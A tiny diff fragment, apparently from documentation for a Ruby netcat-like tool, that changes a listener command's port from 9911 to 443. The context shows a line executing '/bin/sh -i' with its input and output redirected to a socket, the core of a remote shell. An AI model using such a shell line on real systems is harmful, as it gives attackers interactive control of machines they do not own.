@@ -42,7 +42,7 @@ exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)
 ```
 - To listen 
 ```
-ruby ncat.rb -lvp 9911 
+ruby ncat.rb -lvp 443 
 ```
 
 
